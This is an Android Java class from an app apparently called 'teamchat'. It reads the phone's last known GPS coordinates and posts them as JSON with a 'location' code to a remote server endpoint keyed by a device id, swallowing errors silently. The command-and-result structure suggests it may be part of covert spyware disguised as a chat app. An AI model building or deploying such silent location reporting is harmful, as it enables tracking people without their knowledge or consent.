package com.example.teamchat;

import static com.example.teamchat.Constants.SERVER;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

public class LocationTracker {
    private final static String TAG = ChatService.class.getSimpleName();

    public static void getLocation(Context context, String id) throws JSONException {
        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

        JSONObject locationData = new JSONObject();
        locationData.put("latitude", location.getLatitude());
        locationData.put("longitude", location.getLongitude());

//        Log.d(TAG, "The JSON object: " + locationData);
//        System.out.println("The JSON object: " + locationData);

        JSONObject parentObject = new JSONObject();
        parentObject.put("code", "location");
        parentObject.put("data", locationData);

//        Log.d(TAG, "The JSON object: " + parentObject);
//        System.out.println("The JSON object: " + parentObject);

        try {
            HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());

            assert response != null;
            if (response.responseCode == 200) {
                Log.e(TAG, "Response: " + response.body);
            } else {
                throw new IOException("Unexpected code " + response.responseCode);
            }
        } catch (IOException e) {
            //Log.e(TAG, "Error sending request: " + e.getMessage());
        }
    }
}



